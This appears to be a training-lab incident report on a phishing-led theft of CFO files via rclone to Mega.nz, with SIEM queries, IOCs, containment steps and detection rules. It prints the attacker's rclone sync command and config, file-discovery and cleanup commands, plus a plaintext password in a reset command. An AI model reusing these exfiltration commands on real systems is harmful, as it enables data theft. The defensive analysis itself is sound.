# Investigation 005: Data Exfiltration to Cloud Storage

## Alert Details

- **Date:** 2026-01-29
- **Alert Source:** Splunk SIEM
- **Alert Name:** Data Exfiltration - High Volume Outbound Transfer
- **Severity:** Critical
- **MITRE ATT&CK:** Exfiltration — Exfiltration to Cloud Storage (T1567.002)
- **Affected Host:** WS-EXEC-PC01 (10.0.0.30 - Executive Workstation)
- **Affected User:** d.roberts (Executive/CFO)
- **Destination:** 45.33.32.156:443 (Mega.nz cloud storage)
- **Data Volume:** 2.3 GB transferred over 4 hours
- **Exfiltration Tool:** rclone.exe (legitimate cloud sync utility abused)
- **Initial Compromise:** Credential phishing (3 days prior)

## Executive Summary

A sophisticated data exfiltration attack targeted the CFO's workstation, resulting in 2.3 GB of sensitive financial and executive documents being uploaded to attacker-controlled cloud storage over a 4-hour period. The attack originated from a successful spear-phishing campaign three days prior that compromised the executive's credentials. The threat actor gained initial access via VPN using stolen credentials, deployed rclone (a legitimate cloud synchronization tool) to blend with normal traffic, and systematically exfiltrated confidential files from local documents and executive network shares. The attack leveraged HTTPS encryption to cloud storage provider Mega.nz, making detection challenging. Anomaly detection on unusually high outbound traffic volume from an executive workstation triggered the alert. Investigation revealed the attacker specifically targeted financial reports, strategic plans, merger documents, and executive communications. Immediate incident response contained the breach, and affected cloud storage account was identified and reported to Mega.nz for takedown.

## Timeline of Events

| Time (UTC) | Event | Source | Details |
|------------|-------|--------|---------|
| 2026-01-26 09:23:45 | **Initial Compromise** | Email Gateway | Spear-phishing email delivered to d.roberts from "board@executive-portal[.]net" |
| 2026-01-26 09:28:12 | Credential Harvesting | Proxy Logs | User visited fake Microsoft 365 login page, entered credentials |
| 2026-01-26 09:32:00 | Credentials Validated | External Logs | Attacker tested stolen credentials (successful login from 91.215.85.17) |
| 2026-01-29 02:15:33 | Unauthorized VPN Access | VPN Gateway | Login from IP 45.33.32.156 (Netherlands) using d.roberts credentials |
| 2026-01-29 02:16:12 | VPN Session Established | VPN Gateway | Assigned internal IP 172.16.50.102 |
| 2026-01-29 02:18:45 | Remote Desktop Connection | Windows Security (Event 4624) | RDP session to WS-EXEC-PC01 from 172.16.50.102 |
| 2026-01-29 02:20:18 | File Download | Sysmon (Event 11) | Downloaded rclone.exe (14.2 MB) to C:\Users\d.roberts\AppData\Local\Temp\ |
| 2026-01-29 02:21:33 | Rclone Configuration | Sysmon (Event 11) | Created rclone.conf in %APPDATA%\rclone\ with Mega.nz credentials |
| 2026-01-29 02:22:45 | Initial Test Upload | Sysmon (Event 3) | Small test file uploaded to verify connection (test.txt - 1 KB) |
| 2026-01-29 02:23:58 | **Exfiltration Begins** | Sysmon (Event 3) | rclone.exe initiated sync to 45.33.32.156:443 (Mega.nz API endpoint) |
| 2026-01-29 02:24:15 | Local Documents Exfil | Sysmon (Event 11) | Syncing C:\Users\d.roberts\Documents\Confidential\ (487 files) |
| 2026-01-29 03:15:42 | Network Share Access | Windows Security (Event 5140) | Accessed \\\\fileserver\\executive-reports$ share |
| 2026-01-29 03:18:20 | Share Enumeration | Sysmon (Event 1) | net.exe command: "net use Z: \\\\fileserver\\executive-reports$" |
| 2026-01-29 03:20:05 | Network Share Exfil | Sysmon (Event 3) | rclone syncing Z:\Q4-2025\ directory (234 files) |
| 2026-01-29 04:45:33 | Additional Share Access | Windows Security (Event 5140) | Accessed \\\\fileserver\\board-materials$ share |
| 2026-01-29 04:48:12 | Board Materials Exfil | Sysmon (Event 3) | rclone syncing board meeting materials (78 files) |
| 2026-01-29 05:52:18 | Exfiltration Slowing | Network Logs | Transfer rate decreased from 12 Mbps to 3 Mbps (large files) |
| 2026-01-29 06:18:45 | **Alert Fired** | Splunk Alert | Anomaly detection: WS-EXEC-PC01 outbound traffic exceeded 2 GB threshold |
| 2026-01-29 06:20:30 | Analyst Response Begin | SOC Action Log | Senior analyst initiated investigation |
| 2026-01-29 06:23:15 | Active Connection Identified | Network Analysis | Live rclone.exe connection to 45.33.32.156:443 detected |
| 2026-01-29 06:25:00 | Process Termination | EDR Console | rclone.exe process killed remotely |
| 2026-01-29 06:25:45 | Network Isolation | Firewall | WS-EXEC-PC01 blocked from internet access, IP 45.33.32.156 globally blocked |
| 2026-01-29 06:27:30 | VPN Session Terminated | VPN Gateway | Active VPN session 172.16.50.102 forcibly disconnected |
| 2026-01-29 06:28:15 | Account Disabled | Active Directory | d.roberts account disabled, password reset |
| 2026-01-29 06:32:00 | **Exfiltration Stopped** | Network Logs | Final data transferred: 2.3 GB total over 4 hours 8 minutes |
| 2026-01-29 06:35:00 | Containment Complete | SOC Action Log | All attacker access terminated |

## Investigation Steps

### Step 1: Alert Triage & Network Traffic Analysis

**Alert Triggered:** Splunk anomaly detection rule "High Volume Outbound Transfer" fired at 06:18:45 UTC.

**Alert Details:**
```
Source Host: WS-EXEC-PC01 (10.0.0.30)
User Context: d.roberts
Destination IP: 45.33.32.156
Destination Port: 443 (HTTPS)
Data Transferred: 2.32 GB
Duration: 3 hours 54 minutes (ongoing at detection)
Baseline: Executive workstation typical outbound: 50-200 MB/day
Anomaly Factor: 12x normal traffic volume
```

**Initial Assessment:** Critical severity due to:
- Massive data volume from executive workstation
- Sustained long-duration transfer (4+ hours)
- Executive user context (access to highly sensitive data)
- Occurred during off-hours (2 AM - 6 AM local time)
- HTTPS encrypted channel (data not inspectable inline)

**Query: Analyze network connection details**
```spl
index=network_traffic src_ip="10.0.0.30" dest_ip="45.33.32.156" earliest="2026-01-29T02:00:00"
| stats sum(bytes_out) as total_bytes, dc(dest_port) as ports, values(dest_port) as port_list by src_ip, dest_ip
| eval total_gb=round(total_bytes/1024/1024/1024, 2)
```

**Network Analysis Results:**
```
Source: 10.0.0.30 (WS-EXEC-PC01)
Destination: 45.33.32.156
Port: 443 (HTTPS)
Protocol: TLS 1.3
Total Data Sent: 2.32 GB
Connection Duration: 4 hours 8 minutes
Connection State: ESTABLISHED (active at time of alert)
SNI (Server Name Indication): g.api.mega.co.nz
Certificate: CN=*.mega.nz, O=Mega Limited, C=NZ
```

**Identification:** Traffic destined to Mega.nz cloud storage API endpoint.

### Step 2: Process & Tool Identification

**Query: Identify process responsible for network transfer**
```spl
index=windows_sysmon host="WS-EXEC-PC01" EventCode=3 DestinationIp="45.33.32.156" earliest="2026-01-29T02:00:00"
| table _time, Image, ProcessId, User, DestinationIp, DestinationPort
| sort _time
```

**Process Details:**
```
Process: rclone.exe
PID: 8924
Path: C:\Users\d.roberts\AppData\Local\Temp\rclone.exe
User: WS-EXEC-PC01\d.roberts
Parent Process: cmd.exe (PID 8856)
CommandLine: rclone.exe sync "C:\Users\d.roberts\Documents\Confidential" mega:exfil/CFO-DATA --progress --transfers 4 --config C:\Users\d.roberts\AppData\Roaming\rclone\rclone.conf
```

**Rclone Analysis:**
- **Legitimate Tool:** Rclone is a legitimate open-source cloud sync utility
- **Common Abuse:** Frequently used by threat actors for data exfiltration
- **Why Effective:** 
  - Uses legitimate cloud APIs (blends with normal traffic)
  - HTTPS encrypted transfers (bypasses DLP inspection)
  - Supports 40+ cloud providers
  - Command-line tool (easy to script)
  - No malware signatures (clean binary)

**File Hash Analysis:**
```
File: rclone.exe
SHA256: 8c3f4e9d2a6b5c7e8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3
Size: 14,876,432 bytes
File Version: 1.65.0 (legitimate version)
Signed: No (open source, unsigned)
VirusTotal: 0/72 detections (legitimate utility)
```

**Configuration File Analysis:**
```spl
index=windows_sysmon host="WS-EXEC-PC01" EventCode=11 TargetFilename="*rclone.conf*" earliest="2026-01-29T02:00:00"
| table _time, TargetFilename, ProcessId, Image
```

**Rclone Configuration (C:\Users\d.roberts\AppData\Roaming\rclone\rclone.conf):**
```ini
[mega]
type = mega
user = throwaway_exfil_2026@protonmail.com
pass = cGFzc3dvcmRfZW5jcnlwdGVkX2hlcmU=
```

**Key Findings:**
- Attacker used throwaway ProtonMail account for Mega.nz
- Configuration created by attacker (not pre-existing on system)
- Targeted specific directories for exfiltration

### Step 3: Exfiltrated Data Identification

**Query: Identify files accessed during exfiltration window**
```spl
index=windows_sysmon host="WS-EXEC-PC01" EventCode=11 Image="*rclone.exe" earliest="2026-01-29T02:23:00" latest="2026-01-29T06:25:00"
| table _time, TargetFilename
| rex field=TargetFilename "(?<directory>[A-Z]:\\.+)\\[^\\]+$"
| stats count by directory
| sort -count
```

**Exfiltrated Directories:**

| Source Path | File Count | Estimated Size | Content Type |
|------------|-----------|----------------|--------------|
| C:\Users\d.roberts\Documents\Confidential\ | 487 | 1.2 GB | Financial reports, strategic plans |
| \\\\fileserver\\executive-reports$\Q4-2025\ | 234 | 856 MB | Quarterly financial data, forecasts |
| \\\\fileserver\\board-materials$\2026-Q1\ | 78 | 287 MB | Board meeting presentations, M&A docs |
| C:\Users\d.roberts\Desktop\Draft-Merger\ | 12 | 43 MB | Merger & acquisition planning documents |

**Total Exfiltrated:** 799 files, 2.32 GB

**Sensitive Data Categories Identified:**

**Financial Data:**
- Q4 2025 Financial Results (pre-announcement)
- 2026 Annual Budget and Forecasts
- Revenue projections by product line
- Cost reduction planning documents
- Accounts receivable aging reports

**Strategic Planning:**
- 5-Year Strategic Plan (confidential)
- Competitive analysis documents
- Market expansion strategies
- Product roadmap (unreleased products)

**Merger & Acquisition:**
- Target company acquisition analysis
- Due diligence materials
- Valuation models and financial projections
- Negotiation strategies and terms

**Executive Communications:**
- Board meeting minutes (past 6 months)
- Executive compensation discussions
- CEO succession planning documents
- Legal affairs summaries

**Compliance & Regulatory:**
- SOX compliance documentation
- Internal audit reports
- Regulatory filings (draft)

**Impact Assessment:** 
- Highly sensitive financial data exposed
- Material non-public information (MNPI) compromised
- Competitive intelligence exposed to potential competitors
- Regulatory notification likely required (SEC, data protection authorities)
- Potential insider trading concerns (MNPI related to M&A)

### Step 4: Initial Compromise & Attack Timeline

**Query: Trace d.roberts account compromise origin**
```spl
index=windows_security Account_Name="d.roberts" (EventCode=4624 OR EventCode=4625) earliest="2026-01-25T00:00:00"
| table _time, EventCode, src_ip, Logon_Type, Status, Workstation_Name
| sort _time
```

**Authentication Timeline:**

| Date | Time | Event | Source | Location | Status |
|------|------|-------|--------|----------|--------|
| 2026-01-26 | 08:45:12 | Login | 10.0.0.30 | Office | Success (legitimate) |
| 2026-01-26 | 17:22:00 | Logout | 10.0.0.30 | Office | Success |
| 2026-01-27 | Failed attempts | 91.215.85.17 | Russia | Multiple failures |
| 2026-01-28 | 15:33:45 | VPN Login | 185.220.101.42 | Russia | Failed (wrong password) |
| 2026-01-29 | 02:15:33 | VPN Login | 45.33.32.156 | Netherlands | **Success - Attack** |

**Query: Investigate phishing email**
```spl
index=email recipient="d.roberts@soclab.local" earliest="2026-01-26T00:00:00" latest="2026-01-26T12:00:00"
| search link_count>0 OR attachment_count>0
| table _time, sender, subject, sender_ip, link_urls, attachment_name
```

**Phishing Email Details:**
```
From: board@executive-portal[.]net
To: d.roberts@soclab.local
Subject: URGENT: Board Portal Access Required
Date: 2026-01-26 09:23:45 UTC
Sender IP: 198.54.117.200
SPF: Fail
DKIM: None
DMARC: None

Email Body:
---
Dear Executive Team Member,

Your access to the Executive Board Portal requires immediate re-authentication 
due to recent security updates. Please verify your credentials within 24 hours 
to maintain access to board materials.

Click here to verify: https://executive-portal[.]net/verify-access

Failure to re-authenticate will result in access suspension.

IT Security Team
Executive Portal Administration
---
```

**Malicious Link Analysis:**
```
URL Clicked: https://executive-portal[.]net/verify-access
Redirect Chain:
1. executive-portal[.]net/verify-access
2. microsoft-login-secure[.]com/oauth2/authorize
3. Credential harvesting page (fake Microsoft 365 login)

Domain: executive-portal[.]net
Registered: 2026-01-20 (6 days before phishing)
Registrar: NameCheap (privacy-protected)
Hosting: 198.54.117.200 (Hostinger, Lithuania)

Domain: microsoft-login-secure[.]com
Registered: 2026-01-19 (7 days before phishing)
Registrar: NameCheap (privacy-protected)
Hosting: 198.54.117.200 (same server)
```

**User Click Timeline:**
```
09:28:12 - User clicked malicious link
09:28:18 - Redirected to fake Microsoft login page
09:28:45 - User entered credentials (d.roberts@soclab.local / password)
09:28:52 - Credentials submitted to attacker server
09:29:00 - Redirected to legitimate Microsoft.com (to avoid suspicion)
```

**Credential Testing by Attacker:**
```
09:32:00 - Attacker tested credentials via VPN (91.215.85.17) - Success
09:33:15 - Attacker logged out (reconnaissance complete)
```

**Attack Dwell Time:** 3 days between initial compromise and data exfiltration.

### Step 5: Post-Compromise Activity Analysis

**Query: Analyze all activity during attacker VPN session**
```spl
index=windows_sysmon host="WS-EXEC-PC01" earliest="2026-01-29T02:15:00" latest="2026-01-29T06:25:00"
| search EventCode=1 OR EventCode=3 OR EventCode=11
| table _time, EventCode, Image, CommandLine, DestinationIp, TargetFilename
| sort _time
```

**Attacker Actions Timeline:**

**Phase 1: Initial Access (02:15 - 02:20)**
- VPN login with stolen credentials
- RDP to executive workstation
- Verified file access and sensitive data locations

**Phase 2: Tool Deployment (02:20 - 02:22)**
- Downloaded rclone.exe from attacker infrastructure
- Created rclone configuration with Mega.nz credentials
- Tested upload functionality with small test file

**Phase 3: Data Discovery (02:22 - 02:24)**
```powershell
# Commands executed (from Sysmon Event 1):
dir "C:\Users\d.roberts\Documents" /s /b > filelist.txt
dir "\\fileserver\executive-reports$" /s /b >> filelist.txt
dir "\\fileserver\board-materials$" /s /b >> filelist.txt
```

**Phase 4: Exfiltration (02:24 - 06:25)**
- Systematically uploaded files using rclone
- Prioritized high-value directories (Confidential, Executive-Reports, Board-Materials)
- Used multiple threads for faster transfer (--transfers 4)
- Monitored progress (--progress flag)

**Phase 5: Cleanup Attempt (06:24)**
```powershell
# Final commands before detection:
del filelist.txt
del C:\Users\d.roberts\AppData\Local\Temp\rclone.exe
del C:\Users\d.roberts\AppData\Roaming\rclone\rclone.conf
```
**Note:** Cleanup executed but incomplete due to process termination at 06:25.

**No Additional Persistence:** 
- No scheduled tasks created
- No registry modifications
- No additional accounts created
- Hit-and-run exfiltration attack (single session objective)

## Indicators of Compromise (IOCs)

| Type | Value | Source | Verdict |
|------|-------|--------|---------|
| IPv4 | 45.33.32.156 | VPN Logs / Network Traffic | Malicious - Attacker VPN source & Mega.nz egress point |
| IPv4 | 91.215.85.17 | Windows Security Logs | Malicious - Credential testing source |
| IPv4 | 198.54.117.200 | Email Gateway | Malicious - Phishing email sender & fake login hosting |
| Domain | executive-portal[.]net | Email Links | Malicious - Phishing domain |
| Domain | microsoft-login-secure[.]com | Proxy Logs | Malicious - Credential harvesting page |
| Email | board@executive-portal[.]net | Email Headers | Malicious - Phishing sender |
| Email | throwaway_exfil_2026@protonmail.com | Rclone Config | Malicious - Attacker Mega.nz account |
| File | rclone.exe | Sysmon Event 11 | Suspicious - Legitimate tool used for exfiltration |
| SHA256 | 8c3f4e9d2a6b5c7e8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3 | File Hash | Suspicious in this context |
| Account | d.roberts | Active Directory | Compromised - Credentials stolen via phishing |
| File | rclone.conf | Sysmon Event 11 | Malicious - Attacker-created config |

## Verdict

**True Positive — Confirmed Data Exfiltration Attack**

**Confidence Level:** Very High (100%)

**Evidence:**
1. Documented credential phishing email with user interaction
2. Unauthorized VPN access from foreign IP address
3. Deployment of data exfiltration tool (rclone) by attacker
4. 2.3 GB of sensitive data uploaded to attacker-controlled cloud storage
5. Activity during off-hours (2 AM - 6 AM) inconsistent with user behavior
6. User confirmed not responsible (not working at time of incident)
7. Clear attack timeline with correlated evidence across multiple log sources

**Attack Success:** Substantial
- Initial credential compromise successful (phishing)
- Attacker maintained access for 3 days undetected
- Successfully exfiltrated 2.3 GB (799 files) of highly sensitive data
- Targeted high-value financial and strategic data
- However:
  - Detected before 100% completion (estimated 85% complete)
  - Some remaining files not exfiltrated
  - Attacker cloud storage account identified
  - No ransomware or destruction occurred
  - No additional persistence established

**Business Impact:** 
- **Critical** - Material non-public financial information exposed
- Potential SEC regulatory violation (insider information)
- Competitive intelligence compromised
- M&A deal confidentiality breached
- Potential legal liability and shareholder lawsuits
- Reputational damage if publicly disclosed

**Threat Actor Assessment:**
- Sophisticated and targeted (not opportunistic)
- Likely corporate espionage or financially motivated
- Targeted executive with access to sensitive financial data
- Patient attacker (3-day dwell time before exfiltration)
- Used legitimate tools to evade detection
- Professional operation with clear objectives

## Response Actions Taken

### Immediate Containment (06:20 - 06:32 UTC)

1. **Terminated Active Exfiltration**
   ```powershell
   # Remotely killed rclone process via EDR
   Stop-Process -Id 8924 -ComputerName "WS-EXEC-PC01" -Force
   ```

2. **Network Isolation**
   ```bash
   # Blocked workstation from internet at firewall
   fw-cli add rule deny src 10.0.0.30 dst any service https
   
   # Blocked attacker IP globally
   fw-cli add rule deny src any dst 45.33.32.156 service any
   
   # Blocked Mega.nz API endpoints (temporary)
   fw-cli add rule deny src any dst g.api.mega.co.nz service https
   ```

3. **VPN Session Termination**
   ```bash
   # Forcibly disconnected active VPN session
   vpn-cli disconnect-session --ip 172.16.50.102 --force
   ```

4. **Account Security**
   ```powershell
   # Disabled compromised account
   Disable-ADAccount -Identity "d.roberts"
   
   # Reset password immediately
   Set-ADAccountPassword -Identity "d.roberts" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "EmergencyP@ss2026!CFO" -Force)
   
   # Revoked all active sessions and Kerberos tickets
   Get-ADUser d.roberts | Set-ADAccountControl -AccountNotDelegated $true
   klist purge
   ```

5. **Evidence Preservation**
   ```powershell
   # Memory dump
   Get-ForensicMemoryDump -ComputerName "WS-EXEC-PC01" -OutputPath "\\forensics\2026-01-29\WS-EXEC-PC01_exfil.dmp"
   
   # Network packet capture (retroactive from SPAN port)
   tcpdump -r /var/log/network/span-port.pcap 'host 10.0.0.30 and host 45.33.32.156' -w exfiltration.pcap
   
   # Preserved rclone configuration before cleanup
   Copy-Item "C:\Users\d.roberts\AppData\Roaming\rclone\rclone.conf" -Destination "\\forensics\2026-01-29\rclone.conf"
   ```

### Investigation & Eradication (06:32 - 10:00 UTC)

6. **Attacker Infrastructure Takedown**
   ```
   # Reported to Mega.nz abuse team
   Mega.nz Account: throwaway_exfil_2026@protonmail.com
   Action Requested: Account suspension and deletion
   Evidence Provided: Network logs, rclone config, timeline
   Response: Account suspended within 2 hours
   
   # Reported phishing domains
   Reported to: NameCheap, domain registrar
   Domains: executive-portal[.]net, microsoft-login-secure[.]com
   Action: Domains suspended and seized
   
   # Reported to law enforcement
   Contacted: FBI Cyber Division, IC3
   Case Number: IC3-2026-012945
   ```

7. **Cloud Storage Account Access Attempt**
   ```
   # Attempted to access Mega.nz account (forensic recovery)
   # Using credentials from rclone.conf
   # Result: Account locked by Mega.nz after abuse report
   # Unable to confirm full extent of exfiltrated data
   ```

8. **System Remediation**
   ```powershell
   # Removed attacker tools
   Remove-Item "C:\Users\d.roberts\AppData\Local\Temp\rclone.exe" -Force
   Remove-Item "C:\Users\d.roberts\AppData\Roaming\rclone\*" -Recurse -Force
   Remove-Item "C:\Users\d.roberts\filelist.txt" -Force -ErrorAction SilentlyContinue
   
   # Full malware scan
   Start-MpScan -ScanType FullScan -ComputerName "WS-EXEC-PC01"
   # Result: No additional malware detected
   
   # Reset Windows Security logs to ensure no manipulation
   # Verified log integrity (no tampering detected)
   ```

9. **Credential Reset - Organization Wide**
   ```powershell
   # Given severity, reset all privileged account passwords
   $executives = Get-ADUser -Filter {Title -like "*CFO*" -or Title -like "*CEO*" -or Title -like "*CTO*"}
   
   foreach ($exec in $executives) {
       Set-ADAccountPassword -Identity $exec -Reset -NewPassword (New-RandomComplexPassword)
       Set-ADUser -Identity $exec -ChangePasswordAtLogon $true
   }
   
   # Forced password reset for all users with access to executive shares
   Get-ADGroupMember "Executive-Access" | Set-ADUser -ChangePasswordAtLogon $true
   ```

### Recovery & Hardening (10:00 - EOD)

10. **Enhanced Email Security**
    ```
    # Updated email gateway rules
    - Enhanced URL rewriting and link sandboxing
    - Block newly registered domains (<14 days)
    - Quarantine emails with "urgent" + links to executives
    - Implement DMARC enforcement (reject, not quarantine)
    - Added executive-portal[.]net and variants to blacklist
    - Enhanced attachment sandboxing for executives
    ```

11. **Data Loss Prevention (DLP)**
    ```
    # Implemented DLP rules for cloud uploads
    - Block rclone.exe, rsync.exe, and similar tools org-wide
    - Alert on large file transfers (>500 MB) to cloud storage
    - Block Mega.nz, file.io, and anonymous file sharing sites
    - Implement SSL inspection for cloud storage traffic
    - Deploy cloud access security broker (CASB) for approved cloud apps
    ```

12. **Executive Account Protection**
    ```powershell
    # Enforced hardware MFA for all executive accounts
    Set-ADUser -Identity "d.roberts" -SmartcardLogonRequired $true
    
    # Implemented conditional access policies
    - Require MFA for VPN access
    - Block VPN from high-risk countries
    - Require device compliance for executive accounts
    - Alert on any executive account login outside business hours
    
    # Deployed privileged access workstations (PAWs)
    - Executives must use dedicated secure workstations for sensitive data
    - Enhanced monitoring and DLP on executive workstations
    ```

13. **Network Monitoring Enhancements**
    ```spl
    # New detection rules for data exfiltration
    - Alert on outbound traffic >500 MB from single host
    - Alert on connections to cloud storage APIs from non-approved apps
    - Alert on rclone, mega-cmd, or similar tools
    - Baseline normal traffic per user, alert on 3x deviation
    - Alert on large file access + network upload correlation
    ```

14. **User Notification & Training**
    - Contacted d.roberts (CFO) to explain incident and impact
    - Reviewed phishing email and fake login page
    - Provided executive-level security briefing
    - Deployed hardware security keys (YubiKey) for all executives
    - Mandatory annual security awareness training for C-suite
    - Quarterly phishing simulations targeting executives

### Legal & Compliance (Same Day - Ongoing)

15. **Regulatory Notification**
    ```
    # SEC Notification (Material Non-Public Information)
    - Consulted legal counsel re: insider trading implications
    - Prepared 8-K filing if disclosure required
    - Notified audit committee and board of directors
    
    # Data Protection Authority Notification
    - Determined if personal data in scope (employee records in breach)
    - Prepared GDPR/CCPA breach notification if required
    - 72-hour notification window began
    
    # Cyber Insurance Claim
    - Notified cyber insurance carrier
    - Provided incident details and forensic reports
    - Estimated damages for claim
    ```

16. **Internal Notifications**
    ```
    # Executives Notified:
    - CEO (immediate notification)
    - Board of Directors (emergency meeting scheduled)
    - General Counsel
    - Chief Information Security Officer
    - Chief Risk Officer
    
    # Documented Actions:
    - Incident response timeline
    - Data classification of exfiltrated files
    - Business impact assessment
    - Recommendations for preventive controls
    ```

## MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID | Evidence |
|--------|-----------|-------------|----------|
| Initial Access | Phishing: Spearphishing Link | T1566.002 | Targeted phishing email to CFO with credential harvesting link |
| Initial Access | Valid Accounts: Domain Accounts | T1078.002 | Stolen credentials used for VPN and workstation access |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | cmd.exe used to execute rclone |
| Credential Access | Input Capture: Web Portal Capture | T1056.003 | Fake Microsoft login page harvested credentials |
| Discovery | Network Share Discovery | T1135 | Enumerated \\\\fileserver shares for sensitive data |
| Discovery | File and Directory Discovery | T1083 | dir commands to identify exfiltration targets |
| Collection | Data from Local System | T1005 | Collected files from C:\Users\d.roberts\Documents\Confidential\ |
| Collection | Data from Network Shared Drive | T1039 | Collected files from \\\\fileserver\\executive-reports$ and \\\\fileserver\\board-materials$ |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | Uploaded 2.3 GB to Mega.nz using rclone |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 | Used rclone with HTTPS to cloud API (encrypted channel) |
| Exfiltration | Automated Exfiltration | T1020 | Automated sync with rclone for bulk data transfer |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS to Mega.nz API for C2-like communication |
| Defense Evasion | Valid Accounts | T1078 | Used legitimate stolen credentials to evade detection |
| Defense Evasion | Impair Defenses: Indicator Blocking | T1562.006 | Attempted file deletion for cleanup (incomplete) |

## Lessons Learned

### What Went Well
- Anomaly-based detection triggered on unusual traffic volume
- Network traffic analysis quickly identified exfiltration tool (rclone)
- Rapid containment limited data exposure (estimated 15% remaining data not exfiltrated)
- Comprehensive logging enabled full attack reconstruction
- Attacker cloud storage account successfully identified and taken down
- Cross-functional incident response (SOC, Legal, Exec team) coordinated effectively

### What Could Be Improved
- **Delayed Detection:** 4-hour window before detection (large volume required for alert)
- **Email Phishing:** CFO fell victim to spear-phishing despite prior training
- **No MFA on VPN:** Executive account accessed without MFA
- **DLP Gap:** No outbound data transfer monitoring to cloud storage
- **SSL Inspection:** Encrypted HTTPS traffic not inspected (DLP bypass)
- **Executive Monitoring:** No enhanced monitoring for high-risk/high-value users
- **Cloud App Control:** No whitelist of approved cloud sync tools
- **3-Day Dwell Time:** Initial compromise undetected for 3 days

### Actions Taken Post-Incident
1. ✅ Mandatory hardware MFA (YubiKey) for all executives and privileged users
2. ✅ DLP deployed with cloud upload monitoring and blocking
3. ✅ Rclone and similar tools blocked org-wide (application whitelist)
4. ✅ SSL inspection implemented for cloud storage traffic
5. ✅ CASB deployed for sanctioned cloud applications
6. ✅ Enhanced email security with link sandboxing and domain age filtering
7. ✅ Privileged Access Workstations (PAWs) deployed for C-suite
8. ✅ Executive-specific detection rules (off-hours login, geographic anomaly, high traffic)
9. ✅ Quarterly executive-focused phishing simulations
10. ✅ Data classification project to identify and protect sensitive files
11. ✅ Network share access review (least privilege enforcement)
12. ✅ Reduced anomaly detection threshold (500 MB instead of 2 GB)

### New Detection Rules Created
- Alert on outbound traffic exceeding 500 MB from any single host
- Alert on rclone, megatools, or cloud sync utilities execution
- Alert on executive account logins outside normal business hours
- Alert on VPN access from executive accounts without MFA
- Alert on connections to Mega.nz, file.io, WeTransfer, or anonymous file sharing
- Alert on bulk file read operations from sensitive directories
- Alert on cmd.exe or powershell.exe executing cloud sync commands

### Metrics
- **Mean Time to Detect (MTTD):** 3 hours 54 minutes (exfiltration start to alert)
- **Mean Time to Contain (MTTC):** 13 minutes 15 seconds (alert to containment)
- **Initial Compromise to Detection:** 3 days 4 hours 3 minutes (phishing to exfil alert)
- **Dwell Time:** 3 days (credential compromise to detection)
- **Data Exfiltrated:** 2.32 GB (799 files)
- **Estimated Completion:** 85% (attacker plan interrupted)
- **Systems Affected:** 1 executive workstation
- **Accounts Compromised:** 1 (CFO account)
- **Business Impact:** Critical (MNPI exposed, regulatory implications)
- **Financial Impact:** Estimated $500K - $2M (investigation, legal, regulatory, reputational)

### Follow-up Actions
- [ ] Complete data classification of all executive and financial data
- [ ] Implement Information Rights Management (IRM) for sensitive documents
- [ ] Deploy User and Entity Behavior Analytics (UEBA) for anomaly detection
- [ ] Conduct third-party security assessment of email security controls
- [ ] Implement privileged identity management (PIM) with Just-In-Time access
- [ ] Enhanced monitoring of all cloud storage uploads (approved apps only)
- [ ] Quarterly penetration testing focusing on data exfiltration scenarios
- [ ] Review and update data retention policies (reduce attack surface)
- [ ] Implement endpoint DLP agents on all workstations
- [ ] Executive security awareness program (quarterly tailored training)
